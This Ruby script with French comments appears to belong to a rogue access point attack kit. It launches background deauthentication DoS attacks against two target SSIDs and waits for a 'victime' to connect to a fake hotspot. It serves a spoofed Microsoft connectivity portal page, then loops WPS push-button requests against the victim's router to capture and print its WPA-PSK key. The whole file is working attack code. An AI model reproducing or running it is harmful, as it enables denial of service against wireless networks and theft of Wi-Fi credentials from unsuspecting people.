#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'


trap "SIGINT" do
  puts "\e[1;94m[*] Exit en cours... nettoyage des fichiers...\e[0m"
sleep 3
Dir.chdir '/tmp'
sleep 1
if File.exist?("hostapd.psk")
`rm -rf hostapd.psk`
`rm -rf *.pid`
`killall hostapd`
`rm -rf *.conf`
`killall dnsspoof`
`killall xterm`
Dir.chdir '/tmp/hostbase-1.3ES'
sleep 1
`rm -rf *.txt`
puts "Redémarrage de l'interface wifi..."
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ip link set wlan1 down`
`iw dev wlan1 set type managed`
sleep 5
`ip link set wlan1 up`
sleep 3
`systemctl enable NetworkManager.service`
sleep 2
`systemctl start NetworkManager.service`
sleep 4
`rm -rf /var/lib/dhcp/dhcpd.leases`
puts "Bye..."
exit
else
`rm -rf *.pid`
`killall airbase-ng`
`rm -rf *.conf`
`killall dnsspoof`
`killall xterm`
Dir.chdir '/tmp/hostbase-1.3ES'
sleep 1
`rm -rf *.txt`
puts "Redémarrage de l'interface wifi..."
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ip link set wlan1 down`
`iw dev wlan1 set type managed`
sleep 5
`ip link set wlan1 up`
sleep 3
`systemctl enable NetworkManager.service`
sleep 3
`systemctl start NetworkManager.service`
sleep 5
`rm -rf /var/lib/dhcp/dhcpd.leases`
puts "Bye..."
exit
end
end

class Start
def self.interface
load 'accessdos.rb'
puts "Démmarage de la seconde carte wifi..."
system "ip link set #{$cartedos} down"
`iw dev #{$cartedos} set type monitor`
sleep 5
`ip link set #{$cartedos} up`
Start.activeDos
end

def self.activeDos
puts "La DoS contre SSID 1 va commencer maintenant..."
dos = Thread.new { `bash rundosdev.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
Start.dosBis
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end

def self.dosBis
puts "La DoS contre SSID 2 va commencer maintenant..."
dosbis = Thread.new { `bash rundosbis.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve)
Start.victimeAttente  # on appelle la fonction dont on a besoin
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end


def self.victimeAttente      
puts "En attente de la victime... appuyez sur CTRL+C pour quitter..."
`cat mac1ssid1.txt mac2ssid1.txt mac3ssid1.txt > logmac.txt`
until File.read('hostapd.txt').include?('STARTED')  # A VOIR si mettre started ou associated car 2 mode combo présents ici (le crypté et non crypté)
sleep 1
end
File.open("logmac.txt").readlines.each do |logmac|
   puts logmac
$logmac = logmac.chomp
if File.read('hostapd.txt').include?($logmac)
puts "\e[1;32m[*] Victime venant du SSID 1 identifiée\e[0m"
load 'historique.rb'
puts $apmac
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$page}.php index.php`
break
else
puts "\e[1;32m[*] Victime venant du SSID 2 identifiée\e[0m"
load 'historiquebis.rb'
`rm -rf apmac.txt`
`mv apmacbis.txt apmac.txt`
puts $apmac
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$pagebis}.php index.php`
break
end
end
Dir.chdir '/tmp/hostbase-1.3ES'
sleep 1
puts "\e[1;32m[*] Stoping DoS attack...\e[0m"
Process.kill 15, File.read('/tmp/terminal.pid').to_i
Process.kill 15, File.read('/tmp/terminalbis.pid').to_i
`killall xterm`
`killall sleep`
sleep 1
puts "Redemérrage de l'interface wifi et lancement de wpa_cli..."
`ip link set #{$cartedos} down`
`iw dev #{$cartedos} set type managed`
sleep 4
`rfkill unblock all`
`ip link set #{$cartedos} up`
       puts "En attente de l'appui du bouton WPS... CTRL+C pour sortir."
`killall wpa_supplicant`
Dir.chdir '/etc'
sleep 1
`rm -rf wpa_supplicant.conf`
`cp -R /tmp/hostbase-1.3ES/wpa_supplicant.conf /etc/`
sleep 1;
puts $apmac
`sudo wpa_supplicant -B -Dnl80211 -i#{$cartedos} -c/etc/wpa_supplicant.conf`
sleep 2
wpacli = Thread.new do
  while true
    system "xterm -e wpa_cli wps_pbc #{$apmac}"   # On lance wpa_cli et wps_pbc en tant que thread
    sleep(120) # Temps avant la relance de la commande
  end
end
Wps.wpsGrab  
sleep(5000000)
end
end

class Wps
def self.wpsGrab
Dir.chdir '/etc'
sleep 1
until File.read('wpa_supplicant.conf').include?('WPA')
sleep 1
end
puts "\e[1;32m[*] Le bouton WPS a été appuyé, WPA-PSK:\e[0m"
File.open("wpa_supplicant.conf").readlines.each do |wpa|
   puts wpa
end
end
end
